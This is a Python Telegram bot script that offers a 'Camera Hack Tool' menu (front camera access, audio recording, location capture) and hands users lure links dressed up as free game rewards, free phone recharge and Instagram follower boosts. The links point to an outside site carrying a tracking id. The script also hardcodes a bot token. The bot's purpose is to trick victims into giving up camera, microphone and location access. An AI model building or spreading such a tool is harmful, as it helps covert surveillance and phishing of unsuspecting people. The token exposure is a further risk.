import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = '8888173558:AAGaDW5PK1Z7K6TMdDCT7Q0HfDmRFIxahWc'
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start_command(message):
    welcome_text = (
        "<b>WELCOME!</b>\n\n"
        "THIS BOT IS MADE BY ZEESHAN DOMKI.\n"
        "DO NOT USE IT FOR ANY ILLEGAL ACTIVITY. "
        "OWNER WILL NOT BE RESPONSIBLE."
    )
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("Start 🚀", callback_data='press_start'))
    bot.send_message(message.chat.id, welcome_text, parse_mode='HTML', reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def button_click_handler(call):
    bot.answer_callback_query(call.id)
    
    if call.data == 'press_start':
        menu_keyboard = InlineKeyboardMarkup()
        menu_keyboard.add(InlineKeyboardButton("🤗 Camera Hack Tool", callback_data='tool_info'))
        menu_keyboard.add(InlineKeyboardButton("📸 Front Camera Access", callback_data='tool_info'))
        menu_keyboard.add(InlineKeyboardButton("🎙️ Audio Record", callback_data='tool_info'))
        menu_keyboard.add(InlineKeyboardButton("📍 Location Send 🌐", callback_data='tool_info'))
        menu_keyboard.add(InlineKeyboardButton("🧐 Create Link", callback_data='create_link'))
        
        bot.send_message(call.message.chat.id, "<b>Tool Menu</b>", parse_mode='HTML', reply_markup=menu_keyboard)

    elif call.data == 'create_link':
        links_text = (
            "🎁 <b>link</b> 🎁\n"
            "_____________________\n\n"
            "🔥 <b>Free Fire Rewards</b>\n"
            "🔗 https://tusharbairagi.online/dev/free-fire?coupon=Yhkaw6WB&id=8062829612\n\n"
            "🦋 <b>Free Recharge Offer</b>\n"
            "🔗 https://tusharbairagi.online/dev/free-recharge?coupon=Yhkaw6WB&id=8062829612\n\n"
            "📸 <b>Instagram Followers Boost</b>\n"
            "🔗 https://tusharbairagi.online/dev/instagram"
        )
        bot.send_message(call.message.chat.id, links_text, parse_mode='HTML')

    elif call.data == 'tool_info':
        bot.send_message(call.message.chat.id, "Click '🧐 Create Link' to generate your links.")

print("Bot is starting up...")
bot.infinity_polling(timeout=10, long_polling_timeout=5)
